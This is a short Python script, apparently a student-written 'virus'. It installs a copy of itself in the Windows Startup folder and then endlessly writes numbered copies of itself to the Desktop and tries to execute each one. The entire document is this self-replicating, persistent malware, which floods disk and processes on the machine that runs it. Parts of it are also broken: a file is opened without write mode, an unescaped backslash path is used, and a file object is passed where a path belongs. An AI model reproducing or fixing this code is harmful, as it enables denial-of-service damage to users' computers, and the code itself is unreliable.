
pstr = '''

import os
n = 0
while True:
    n +=1
    file1 = open("C:/Users/student/Desktop/Virus" + str(n) + ".py","w")
    file1.writelines("pstr = '''"+ pstr +"'''" + pstr)
    file1.close()
    from subprocess import call
    call(["python", str(file1)])
'''
n = 0
file0 = open("C:\Users\student\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Virus.py")
file0.writelines("pstr = '''"+ pstr +"'''" + pstr)
file0.close()
while True:
    n +=1
    file1 = open("C:/Users/student/Desktop/Virus" + str(n) + ".py","w")
    file1.writelines("pstr = '''"+ pstr +"'''" + pstr)
    file1.close()
    from subprocess import call
    call(["python", str(file1)])
        
